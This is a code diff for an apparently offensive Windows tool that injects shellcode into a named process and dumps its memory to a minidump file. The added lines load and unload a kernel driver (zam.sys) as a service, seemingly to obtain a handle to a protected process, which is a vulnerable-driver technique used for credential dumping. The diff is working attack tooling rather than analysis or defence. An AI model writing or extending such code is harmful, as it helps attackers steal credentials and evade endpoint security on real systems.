@@ -6,11 +6,16 @@
 #include <dbghelp.h>
 #include "shellcode.x64.h"
 #include "mlwrfox.h"
+#include "service.h"
 #include "util.h"
 
 void usage(char ** argv)
 {
-	printf("Usage: %s [-p process] [-o dumpfile]\n", argv[0]);
+	printf("Usage: %s [...]\n", argv[0]);
+	printf("\t -p <process> Name of process to inject & dump memory (REQUIRED)\n");
+	printf("\t -o <path>    Path to dump minidump file to. (REQUIRED)\n");
+	printf("\t -l <path>    Path to zam.sys driver to load into kernel memory\n");
+	printf("\t -u <path>    Path to zam.sys driver to unload into kernel memory\n");
 	ExitProcess(0);
 };
 
@@ -25,6 +30,30 @@ int main(int argc, char **argv)
   {
 	  switch(argv[1][1])
 	  {
+		  case 'l':
+			  ++argv;
+			  --argc;
+			  if ( LoadDriver(argv[1]) ) {
+				  printf("[+] loaded %s as %s successfully\n", 
+						  argv[1], SVC_NAME);
+			  } else {
+				  printf("[ ] failed to load %s into kernel memory 0x%x\n",
+						  argv[1], GetLastError());
+			  };
+			  ExitProcess(0);
+			  break;
+	          case 'u':
+			  ++argv;
+			  --argc;
+			  if ( UnloadDriver() ) {
+				  printf("[+] unloaded %s successfully\n",
+						  SVC_NAME);
+			  } else { 
+				  printf("[ ] failed to stop %s in kernel memory 0x%x\n",
+						  SVC_NAME, GetLastError());
+			  };
+			  ExitProcess(0);
+			  break;
 		  case 'p':
 			  ++argv;
 			  --argc;
@@ -42,6 +71,12 @@ int main(int argc, char **argv)
 
 	  ++argv;
 	  --argc;
+  };
+
+  if ( pname == NULL || outpath == NULL )
+  {
+	  printf("[ ] provide -p <process> and -o outpath\n");
+	  ExitProcess(0);
   };
 
   if ((pid = LocateProcess(pname)) != 0)
@@ -101,11 +136,12 @@ int main(int argc, char **argv)
 				NULL
 			  );
 
-			  LocateThread(hDriver, pid, pMemory, pStrMem);
+			  LocateThread(hDriver, pid, pMemory, pStrMem, FALSE);
+			  Sleep(3000);
+			  LocateThread(hDriver, pid, pMemory, pStrMem, TRUE);
 Finish:
 			  VirtualFree(pMemory, 0, MEM_RELEASE);
 			  VirtualFree(pStrMem, 0, MEM_RELEASE);
-
 		  } else { 
 			  printf("[ ] failed to steal handle to %s\n", pname);
 			  goto Cleanup;
